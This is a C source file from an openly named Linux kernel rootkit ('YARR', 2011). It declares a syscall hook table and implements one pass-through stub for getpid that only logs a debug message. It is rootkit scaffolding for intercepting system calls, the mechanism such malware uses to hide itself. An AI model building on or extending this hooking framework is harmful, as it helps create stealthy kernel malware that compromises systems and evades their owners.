/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/syscalls.h>
#include <linux/unistd.h>

#include "syscallhooks.h"
#include "hook.h"
#include "debug.h"

// TODO: This is a fuck up. Each kernel flavour can has its own number of
// syscalls. The one where I'm working right now has 349, so there are 349
// NULL-initialized positions (minus the hooked syscalls). But what will
// happen with a kernel with a different amount of syscalls? Hu-ah! solve it
// yourself :).

/*
 * Here we declare all the system calls that we will capture. This array has
 * as much positions as syscalls are in the kernel. Each position has NULL or
 * a function address. During yarr initialization if the position if this
 * table is non-null then the corresponding syscall is hooked.
 *
 * Whenever a new hook is developed you should substitute the corresponding
 * position with the address of your hook function.
 */
void *syscalls_hooks[NR_syscalls] = {
	NULL, // 0
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 5
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 10
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 15
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_getpid, // 20
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 25
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 30
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 35
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 40
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 45
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 50
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 55
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 60
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 65
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 70
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 75
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 80
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 85
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 90
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 95
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 100
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 105
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 110
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 115
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 120
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 125
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 130
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 135
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 140
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 145
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 150
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 155
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 160
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 165
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 170
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 175
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 180
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 185
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 190
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 195
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 200
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 205
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 210
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 215
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 220
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 225
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 230
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 235
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 240
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 245
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 250
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 255
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 260
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 265
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 270
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 275
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 280
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 285
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 290
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 295
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 300
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 305
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 310
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 315
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 320
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 325
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 330
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 335
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 340
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 345
	NULL,
	NULL,
	NULL
};

asmlinkage long yarr_getpid() {
	long (*sys_getpid)(void);

	debug("yarr_getpid() called.\n");
	sys_getpid = sys_call_table_backup[__NR_getpid];
	return sys_getpid();
}

